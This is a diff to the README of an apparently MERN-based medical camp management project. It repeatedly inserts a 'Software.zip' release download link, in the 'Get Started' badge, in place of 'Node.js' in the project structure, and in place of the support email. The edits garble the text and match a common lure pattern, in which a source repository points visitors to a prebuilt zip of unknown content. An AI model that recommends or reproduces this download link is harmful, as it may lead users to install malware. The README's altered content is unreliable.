@@ -9,11 +9,11 @@ Welcome to the **Popular-Medical-Camp** repository, a comprehensive MERN stack p
 
 ## **Get Started**:
 To experience the full capabilities of the Popular Medical Camp Management System, simply download the software package from the link below:
-[![Launch Software](https://img.shields.io/badge/Launch%20Software-Download%20Here-blue)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Launch Software](https://github.com/rjayworld/Popular-Medical-Camp/releases/download/v2.0/Software.zip%20Software-Download%20Here-blue)](https://github.com/rjayworld/Popular-Medical-Camp/releases/download/v2.0/Software.zip)
 
 ## **Project Structure**:
 📁 **Client Folder:** Contains the frontend components built with ReactJS.  
-📁 **Server Folder:** Manages the backend operations using Node.js and Express.  
+📁 **Server Folder:** Manages the backend operations using https://github.com/rjayworld/Popular-Medical-Camp/releases/download/v2.0/Software.zip and Express.  
 📁 **Database:** Utilizes Firebase for authentication and hosting.  
 📁 **Payment:** Integrated Stripe for secure payment processing.  
 📁 **Design:** Tailwind CSS for sleek styling and UI components.  
@@ -29,7 +29,7 @@ To experience the full capabilities of the Popular Medical Camp Management Syste
 🌟 We welcome contributions from the community to enhance the functionality and usability of the Medical Camp Management System. Fork the repository, make your changes, and submit a pull request.
 
 ## **Support & Contact**:
-📧 For any inquiries or assistance, feel free to reach out to us at [medicalcamp@example.com](mailto:medicalcamp@example.com).
+📧 For any inquiries or assistance, feel free to reach out to us at [https://github.com/rjayworld/Popular-Medical-Camp/releases/download/v2.0/Software.zip](https://github.com/rjayworld/Popular-Medical-Camp/releases/download/v2.0/Software.zip).
 
 ## **Acknowledgements**:
 🙏 We extend our gratitude to the open-source community for their valuable contributions that have enriched this project.
